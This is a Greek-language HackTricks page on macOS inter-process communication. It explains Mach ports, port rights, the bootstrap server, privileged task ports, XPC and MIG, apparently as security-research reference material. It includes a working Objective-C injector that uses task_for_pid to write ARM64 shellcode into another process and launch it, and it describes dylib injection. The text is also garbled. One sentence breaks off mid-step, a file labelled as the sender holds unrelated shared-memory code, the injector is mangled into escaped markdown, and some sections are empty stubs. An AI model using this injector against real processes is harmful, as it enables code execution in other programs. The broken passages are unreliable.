# macOS IPC - Inter Process Communication

<details>

<summary><strong>Μάθετε το χάκινγκ AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team Expert του HackTricks AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Μήνυμα Mach μέσω Θυρών

### Βασικές Πληροφορίες

Το Mach χρησιμοποιεί **εργασίες** ως τη **μικρότερη μονάδα** για την κοινή χρήση πόρων, και κάθε εργασία μπορεί να περιέχει **πολλά νήματα**. Αυτές οι **εργασίες και νήματα αντιστοιχούν 1:1 σε διεργασίες και νήματα POSIX**.

Η επικοινωνία μεταξύ εργασιών πραγματοποιείται μέσω της Διαδικασίας Επικοινωνίας Διεργασιών Mach (IPC), χρησιμοποιώντας μονοδιευθυντικά κανάλια επικοινωνίας. **Τα μηνύματα μεταφέρονται μεταξύ θυρών**, οι οποίες λειτουργούν ως **ουρές μηνυμάτων** που διαχειρίζεται το πυρήνας.

Κάθε διεργασία έχει μια **πίνακα IPC**, όπου είναι δυνατό να βρεθούν οι **θύρες mach της διεργασίας**. Το όνομα μιας θύρας mach είναι στην πραγματικότητα ένας αριθμός (ένας δείκτης στο αντικείμενο πυρήνα).

Μια διεργασία μπορεί επίσης να στείλει ένα όνομα θύρας με κάποια δικαιώματα **σε μια διαφορετική εργασία** και το πυρήνας θα κάνει αυτήν την εγγραφή στο **πίνακα IPC της άλλης εργασίας** να εμφανιστεί.

### Δικαιώματα Θύρας

Τα δικαιώματα θύρας, τα οποία καθορίζουν ποιες λειτουργίες μπορεί να εκτελέσει μια εργασία, είναι καίριας σημασίας για αυτήν την επικοινωνία. Τα πιθανά **δικαιώματα θύρας** είναι ([ορισμοί από εδώ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Δικαίωμα Λήψης**, το οποίο επιτρέπει τη λήψη μηνυμάτων που στέλνονται στη θύρα. Οι θύρες Mach είναι ουρές MPSC (πολλαπλών παραγωγών, μονός καταναλωτής), που σημαίνει ότι μπορεί να υπάρχει μόνο **ένα δικαίωμα λήψης για κάθε θύρα** σε ολόκληρο το σύστημα (διαφορετικά από τα αγωγά, όπου πολλές διεργασίες μπορούν να κρατούν όλες τις περιγραφές αρχείων στο άκρο ανάγνωσης ενός αγωγού).
* Μια **εργασία με το Δικαίωμα Λήψης** μπορεί να λαμβάνει μηνύματα και **να δημιουργεί Δικαιώματα Αποστολής**, επιτρέποντάς της να στέλνει μηνύματα. Αρχικά μόνο η **ίδια εργασία έχει το Δικαίωμα Λήψης πάνω από τη θύρα της**.
* **Δικαίωμα Αποστολής**, το οποίο επιτρέπει την αποστολή μηνυμάτων στη θύρα.
* Το Δικαίωμα Αποστολής μπορεί να **κλωνοποιηθεί** έτσι μια εργασία που κατέχει ένα Δικαίωμα Αποστολής μπορεί να κλωνοποιήσει το δικαίωμα και **να το χορηγήσει σε μια τρίτη εργασία**.
* **Δικαίωμα Αποστολής-μία-φοράς**, το οποίο επιτρέπει την αποστολή ενός μηνύματος στη θύρα και στη συνέχεια εξαφανίζεται.
* **Δικαίωμα Συνόλου Θυρών**, το οποίο υποδηλώνει ένα _σύνολο θυρών_ αντί για μια μεμονωμένη θύρα. Η αποσύνδεση ενός μηνύματος από ένα σύνολο θυρών αποσυνδέει ένα μήνυμα από μία από τις θύρες που περιέχει. Τα σύνολα θυρών μπορούν να χρησιμοποιηθούν για να ακούσουν ταυτόχρονα σε πολλές θύρες, πολύ παρόμοια με το `select`/`poll`/`epoll`/`kqueue` στο Unix.
* **Νεκρό όνομα**, το οποίο δεν είναι ένα πραγματικό δικαίωμα θύρας, αλλά απλώς ένας χώρος κράτησης. Όταν μια θύρα καταστραφεί, όλα τα υπάρχοντα δικαιώματα θύρας στη θύρα μετατρέπονται σε νεκρά ονόματα.

**Οι εργασίες μπορούν να μεταφέρουν ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ σε άλλους**, επιτρέποντάς τους να στέλνουν μηνύματα πίσω. **Τα ΔΙΚΑΙΩΜΑΤΑ ΑΠΟΣΤΟΛΗΣ μπορούν επίσης να κλωνοποιηθούν, έτσι μια εργασία μπορεί να διπλασιάσει και να δώσει το δικαίωμα σε μια τρίτη εργασία**. Αυτό, σε συνδυασμό με ένα ενδιάμεσο διεργασία γνωστό ως **διακομιστή εκκίνησης**, επιτρέπει αποτελεσματική επικοινωνία μεταξύ εργασιών.

### Θύρες Αρχείων

Οι θύρες αρχείων επιτρέπουν την ενθυλάκωση περιγραφέων αρχείων σε θύρες Mac (χρησιμοποιώντας δικαιώματα θύρας Mach). Είναι δυνατόν να δημιουργηθεί ένα `fileport` από έναν δεδομένο FD χρησιμοποιώντας το `fileport_makeport` και να δημιουργηθεί ένα FD από ένα fileport χρησιμοποιώντας το `fileport_makefd`.

### Δημιουργία Επικοινωνίας

#### Βήματα:

Όπως αναφέρεται, για να δημιουργηθεί το κανάλι επικοινωνίας, εμπλέκεται ο **διακομιστής εκκίνησης** (**launchd** στο mac).

1. Η Εργασία **Α** ξεκινά μια **νέα θύρα**, αποκτώντας ένα **δικαίωμα ΛΗΨΗΣ** στη διαδικασία.
2. Η Εργασία **Α**, κατέχοντας το δικαίωμα ΛΗΨΗΣ, **δημιουργεί ένα δικαίωμα ΑΠΟΣΤΟΛΗΣ για τη θύρα**.
3. Η Εργασία **Α** καθιερώνει μια **σύνδεση** με τον **διακομιστή εκκίνησης**, παρέχον

```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```

Οι διεργασίες που διαθέτουν ένα _**δικαίωμα λήψης (receive right)**_ μπορούν να λαμβάνουν μηνύματα σε ένα θύρα Mach. Αντίστροφα, οι **αποστολείς** παραχωρούνται ένα _**δικαίωμα αποστολής (send)**_ ή ένα _**δικαίωμα αποστολής μία φορά (send-once right)**_. Το δικαίωμα αποστολής μία φορά είναι αποκλειστικά για την αποστολή ενός μόνο μηνύματος, μετά το οποίο γίνεται άκυρο.

Για να επιτευχθεί μια εύκολη **διπλής κατεύθυνσης επικοινωνία**, μια διεργασία μπορεί να καθορίσει μια **θύρα mach** στην κεφαλίδα μηνύματος mach που ονομάζεται _reply port_ (**`msgh_local_port`**) όπου ο **παραλήπτης** του μηνύματος μπορεί να **στείλει μια απάντηση** σε αυτό το μήνυμα. Τα bitflags στο **`msgh_bits`** μπορούν να χρησιμοποιηθούν για να **υποδείξουν** ότι ένα **δικαίωμα αποστολής μία φορά** πρέπει να προκύψει και να μεταφερθεί για αυτήν τη θύρα (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
Σημειώστε ότι αυτού του είδους η διπλής κατεύθυνσης επικοινωνία χρησιμοποιείται σε μηνύματα XPC που αναμένουν μια απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Ωστόσο, **συνήθως δημιουργούνται διαφορετικές θύρες** όπως εξηγήθηκε προηγουμένως για τη δημιουργία της διπλής κατεύθυνσης επικοινωνίας.
{% endhint %}

Τα άλλα πεδία της κεφαλίδας του μηνύματος είναι:

* `msgh_size`: το μέγεθος ολόκληρου του πακέτου.
* `msgh_remote_port`: η θύρα στην οποία αποστέλλεται αυτό το μήνυμα.
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: το ID αυτού του μηνύματος, το οποίο ερμηνεύεται από τον παραλήπτη.

{% hint style="danger" %}
Σημειώστε ότι τα **μηνύματα mach αποστέλλονται μέσω μιας \_θύρας mach**\_, η οποία είναι ένα κανάλι επικοινωνίας **μοναδικού παραλήπτη**, **πολλαπλών αποστολέων** που έχει ενσωματωθεί στον πυρήνα mach. **Πολλές διεργασίες** μπορούν να **στείλουν μηνύματα** σε μια θύρα mach, αλλά ανά πάσα στιγμή μόνο **μια διεργασία μπορεί να διαβάσει** από αυτήν.
{% endhint %}

### Απαρίθμηση θυρών

```bash
lsmp -p <pid>
```

Μπορείτε να εγκαταστήσετε αυτό το εργαλείο στο iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Σημειώστε πως ο **αποστολέας** εκχωρεί ένα θύρα, δημιουργεί ένα **δικαίωμα αποστολής** για το όνομα `org.darlinghq.example` και το στέλνει στο **διακομιστή εκκίνησης** ενώ ο αποστολέας ζήτησε το **δικαίωμα αποστολής** αυτού του ονόματος και το χρησιμοποίησε για να **στείλει ένα μήνυμα**.

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```

#### Αποστολέας.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/shm.h>

#define SHMKEY 75
#define SHMSZ 27

int main() {
    int shmid;
    key_t key;
    char *shm, *s;

    key = SHMKEY;

    if ((shmid = shmget(key, SHMSZ, IPC_CREAT | 0666)) < 0) {
        perror("shmget");
        exit(1);
    }

    if ((shm = shmat(shmid, NULL, 0)) == (char *) -1) {
        perror("shmat");
        exit(1);
    }

    s = shm;

    for (char c = 'a'; c <= 'z'; c++) {
        *s++ = c;
    }
    *s = '\0';

    while (*shm != '*') {
        sleep(1);
    }

    return 0;
}
```

```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```

### Προνομιούχες Θύρες

* **Θύρα οικοδεσπότη**: Αν ένας διεργασία έχει δικαίωμα **Αποστολής** πάνω από αυτήν τη θύρα, μπορεί να λάβει **πληροφορίες** για το **σύστημα** (π.χ. `host_processor_info`).
* **Προνομιούχα θύρα οικοδεσπότη**: Μια διεργασία με δικαίωμα **Αποστολής** πάνω από αυτήν τη θύρα μπορεί να εκτελέσει **προνομιούχες ενέργειες** όπως φόρτωση επέκτασης πυρήνα. Η **διεργασία πρέπει να είναι ριζοχρήστης** για να λάβει αυτήν την άδεια.
* Επιπλέον, για να καλέσει το API **`kext_request`** απαιτούνται άλλα δικαιώματα **`com.apple.private.kext*`** τα οποία δίνονται μόνο σε δυαδικά αρχεία της Apple.
* **Θύρα ονόματος εργασίας:** Μια μη προνομιούχα έκδοση της _θύρας εργασίας_. Αναφέρεται στην εργασία, αλλά δεν επιτρέπει τον έλεγχό της. Το μόνο που φαίνεται να είναι διαθέσιμο μέσω αυτής είναι το `task_info()`.
* **Θύρα εργασίας** (επίσης γνωστή ως θύρα πυρήνα)**:** Με δικαίωμα Αποστολής πάνω από αυτήν τη θύρα είναι δυνατόν να ελέγχεται η εργασία (ανάγνωση/εγγραφή μνήμης, δημιουργία νημάτων...).
* Καλέστε το `mach_task_self()` για να **λάβετε το όνομα** γι' αυτήν τη θύρα για την εργασία του καλούντος. Αυτή η θύρα κληρονομείται μόνο κατά τη διάρκεια **`exec()`**· μια νέα εργασία που δημιουργείται με το `fork()` λαμβάνει μια νέα θύρα εργασίας (ως ειδική περίπτωση, μια εργασία λαμβάνει επίσης μια νέα θύρα εργασίας μετά το `exec()` σε ένα δυαδικό suid). Ο μόνος τρόπος να δημιουργηθεί μια εργασία και να ληφθεί η θύρα της είναι να εκτελεστεί ο ["χορός ανταλλαγής θυρών"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) κατά τη διάρκεια ενός `fork()`.
* Αυτοί είναι οι περιορισμοί για την πρόσβαση στη θύρα (από το `macos_task_policy` από το δυαδικό `AppleMobileFileIntegrity`):
* Αν η εφαρμογή έχει το δικαίωμα **`com.apple.security.get-task-allow`**, διεργασίες από τον **ίδιο χρήστη μπορούν να έχουν πρόσβαση στη θύρα εργασίας** (συνήθως προστίθεται από το Xcode για αποσφαλμάτωση). Η διαδικασία **επικύρωσης** δεν το επιτρέπει στις παραγωγικές εκδόσεις.
* Οι εφαρμογές με το δικαίωμα **`com.apple.system-task-ports`** μπορούν να λάβουν τη **θύρα εργασίας για οποιαδήποτε** διεργασία, εκτός από τον πυρήνα. Σε παλαιότερες εκδόσεις ονομαζόταν **`task_for_pid-allow`**. Αυτό δίνεται μόνο σε εφαρμογές της Apple.
* **Ο ριζοχρήστης μπορεί να έχει πρόσβαση στις θύρες εργασίας** εφαρμογών που **δεν** έχουν μεταγλωττιστεί με ένα **σκληρυνμένο** χρόνο εκτέλεσης (και όχι από την Apple).

### Εισαγωγή Shellcode σε νήμα μέσω της θύρας Εργασίας

Μπορείτε να αντλήσετε ένα shellcode από:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```

Το entitlements.plist περιέχει τις δικαιώματα που έχει ένα εκτελέσιμο αρχείο στο macOS. Τα entitlements μπορούν να περιορίσουν τις δυνατότητες ενός προγράμματος, όπως η πρόσβαση σε συγκεκριμένα αρχεία ή η επικοινωνία με άλλες εφαρμογές μέσω της διαδικασίας IPC. Είναι σημαντικό να ελέγχετε τα entitlements που έχουν ανατεθεί σε κάθε εκτελέσιμο αρχείο για να διασφαλίσετε την ασφάλεια του συστήματός σας. %\}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```

**Μεταγλωττίστε** τον προηγούμενο προγραμματισμό και προσθέστε τα **δικαιώματα** ώστε να μπορείτε να εισάγετε κώδικα με τον ίδιο χρήστη (αλλιώς θα χρειαστεί να χρησιμοποιήσετε **sudo**).

<details>

<summary>sc_injector.m</summary>

\`\`\`objectivec // gcc -framework Foundation -framework Appkit sc\_injector.m -o sc\_injector

\#import \<Foundation/Foundation.h> #import \<AppKit/AppKit.h> #include \<mach/mach\_vm.h> #include \<sys/sysctl.h>

\#ifdef **arm64**

kern\_return\_t mach\_vm\_allocate ( vm\_map\_t target, mach\_vm\_address\_t \*address, mach\_vm\_size\_t size, int flags );

kern\_return\_t mach\_vm\_write ( vm\_map\_t target\_task, mach\_vm\_address\_t address, vm\_offset\_t data, mach\_msg\_type\_number\_t dataCnt );

\#else #include \<mach/mach\_vm.h> #endif

\#define STACK\_SIZE 65536 #define CODE\_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala char injectedCode\[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";

int inject(pid\_t pid){

task\_t remoteTask;

// Get access to the task port of the process we want to inject into kern\_return\_t kr = task\_for\_pid(mach\_task\_self(), pid, \&remoteTask); if (kr != KERN\_SUCCESS) { fprintf (stderr, "Unable to call task\_for\_pid on pid %d: %d. Cannot continue!\n",pid, kr); return (-1); } else{ printf("Gathered privileges over the task port of process: %d\n", pid); }

// Allocate memory for the stack mach\_vm\_address\_t remoteStack64 = (vm\_address\_t) NULL; mach\_vm\_address\_t remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate(remoteTask, \&remoteStack64, STACK\_SIZE, VM\_FLAGS\_ANYWHERE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach\_error\_string(kr)); return (-2); } else {

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64); }

// Allocate memory for the code remoteCode64 = (vm\_address\_t) NULL; kr = mach\_vm\_allocate( remoteTask, \&remoteCode64, CODE\_SIZE, VM\_FLAGS\_ANYWHERE );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach\_error\_string(kr)); return (-2); }

// Write the shellcode to the allocated memory kr = mach\_vm\_write(remoteTask, // Task port remoteCode64, // Virtual Address (Destination) (vm\_address\_t) injectedCode, // Source 0xa9); // Length of the source

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach\_error\_string(kr)); return (-3); }

// Set the permissions on the allocated code memory kr = vm\_protect(remoteTask, remoteCode64, 0x70, FALSE, VM\_PROT\_READ | VM\_PROT\_EXECUTE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Set the permissions on the allocated stack memory kr = vm\_protect(remoteTask, remoteStack64, STACK\_SIZE, TRUE, VM\_PROT\_READ | VM\_PROT\_WRITE);

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach\_error\_string(kr)); return (-4); }

// Create thread to run shellcode struct arm\_unified\_thread\_state remoteThreadState64; thread\_act\_t remoteThread;

memset(\&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK\_SIZE / 2); // this is the real stack //remoteStack64 -= 8; // need alignment of 16

const char\* p = (const char\*) remoteCode64;

remoteThreadState64.ash.flavor = ARM\_THREAD\_STATE64; remoteThreadState64.ash.count = ARM\_THREAD\_STATE64\_COUNT; remoteThreadState64.ts\_64.\_\_pc = (u\_int64\_t) remoteCode64; remoteThreadState64.ts\_64.\_\_sp = (u\_int64\_t) remoteStack64;

printf ("Remote Stack 64 0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread\_create\_running(remoteTask, ARM\_THREAD\_STATE64, // ARM\_THREAD\_STATE64, (thread\_state\_t) \&remoteThreadState64.ts\_64, ARM\_THREAD\_STATE64\_COUNT , \&remoteThread );

if (kr != KERN\_SUCCESS) { fprintf(stderr,"Unable to create remote thread: error %s", mach\_error\_string (kr)); return (-3); }

return (0); }

pid\_t pidForProcessName(NSString \*processName) { NSArray \*arguments = @\[@"pgrep", processName]; NSTask \*task = \[\[NSTask alloc] init]; \[task setLaunchPath:@"/usr/bin/env"]; \[task setArguments:arguments];

NSPipe \*pipe = \[NSPipe pipe]; \[task setStandardOutput:pipe];

NSFileHandle \*file = \[pipe fileHandleForReading];

\[task launch];

NSData \*data = \[file readDataToEndOfFile]; NSString \*string = \[\[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid\_t)\[string integerValue]; }

BOOL isStringNumeric(NSString _str) { NSCharacterSet_ nonNumbers = \[\[NSCharacterSet decimalDigitCharacterSet] invertedSet]; NSRange r = \[str rangeOfCharacterFromSet: nonNumbers]; return r.location == NSNotFound; }

int main(int argc, const char \* argv\[]) { @autoreleasepool { if (argc < 2) { NSLog(@"Usage: %s ", argv\[0]); return 1; }

NSString \*arg = \[NSString stringWithUTF8String:argv\[1]]; pid\_t pid;

if (isStringNumeric(arg)) { pid = \[arg intValue]; } else { pid = pidForProcessName(arg); if (pid == 0) { NSLog(@"Error: Process named '%@' not found.", arg); return 1; } else{ printf("Found PID of process '%s': %d\n", \[arg UTF8String], pid); } }

inject(pid); }

return 0; }

````
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
````

#### Διείσδυση Dylib σε νήμα μέσω της θύρας Task

Στο macOS τα **νήματα** μπορούν να χειριστούν μέσω του **Mach** ή χρησιμοποιώντας το **posix `pthread` api**. Το νήμα που δημιουργήθηκε στην προηγούμενη διείσδυση, δημιουργήθηκε χρησιμοποιώντας το Mach api, οπότε **δεν είναι συμμορφωμένο με το posix**.

Ήταν δυνατό να **διεισδύσουμε ένα απλό shellcode** για να εκτελέσουμε μια εντολή επειδή **δεν χρειαζόταν να λειτουργήσει με συμμορφωμένα posix** apis, μόνο με το Mach. **Πιο πολύπλοκες διεισδύσεις** θα χρειαζόντουσαν το **νήμα** να είναι επίσης **συμμορφωμένο με το posix**.

Συνεπώς, για να **βελτιώσετε το νήμα** θα πρέπει να καλέσει το **`pthread_create_from_mach_thread`** το οποίο θα **δημιουργήσει ένα έγκυρο pthread**. Στη συνέχεια, αυτό το νέο pthread μπορεί να **καλέσει το dlopen** για να **φορτώσει ένα dylib** από το σύστημα, έτσι αντί να γράψετε νέο shellcode για να εκτελέσετε διαφορετικές ενέργειες είναι δυνατό να φορτώσετε προσαρμοσμένες βιβλιοθήκες.

Μπορείτε να βρείτε **παραδειγματικά dylibs** σε (για παράδειγμα αυτό που δημιουργεί ένα αρχείο καταγραφής και μετά μπορείτε να το ακούσετε):

\`\`\`bash gcc -framework Foundation -framework Appkit dylib\_injector.m -o dylib\_injector ./inject \`\`\` ### Απαγωγή Νήματος μέσω Θύρας Task

Σε αυτήν την τεχνική γίνεται απαγωγή ενός νήματος της διεργασίας:

### XPC

#### Βασικές Πληροφορίες

Το XPC, που σημαίνει XNU (το πυρήνας που χρησιμοποιείται από το macOS) Διαδικασία Επικοινωνίας, είναι ένα πλαίσιο για **επικοινωνία μεταξύ διεργασιών** στο macOS και στο iOS. Το XPC παρέχει ένα μηχανισμό για την πραγματοποίηση **ασύγχρονων κλήσεων μεθόδων με ασφάλεια μεταξύ διαφορετικών διεργασιών** στο σύστημα. Αποτελεί μέρος του παραδείγματος ασφαλείας της Apple, επιτρέποντας τη **δημιουργία εφαρμογών με διαχωρισμό προνομίων** όπου κάθε **συστατικό** λειτουργεί με **μόνο τα δικαιώματα που χρειάζεται** για την εκτέλεση της εργασίας του, περιορίζοντας έτσι την πιθανή ζημιά από μια διεργασία που έχει διαρρεύσει.

Για περισσότερες πληροφορίες σχετικά με το πώς αυτή η **επικοινωνία λειτουργεί** και πώς **μπορεί να είναι ευάλωτη** ελέγξτε:

### MIG - Μετατροπέας Διεπαφής Mach

Ο MIG δημιουργήθηκε για να **απλοποιήσει τη διαδικασία δημιουργίας κώδικα Mach IPC**. Βασικά **δημιουργεί τον απαιτούμενο κώδικα** για τον εξυπηρετητή και τον πελάτη ώστε να επικοινωνούν με μια δεδομένη ορισμού. Ακόμα κι αν ο δημιουργημένος κώδικας είναι άσχημος, ένας προγραμματιστής θα χρειαστεί απλώς να τον εισάγει και ο κώδικάς του θα είναι πολύ απλούστερος από πριν.

Για περισσότερες πληροφορίες ελέγξτε:

### Αναφορές

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)



</details>
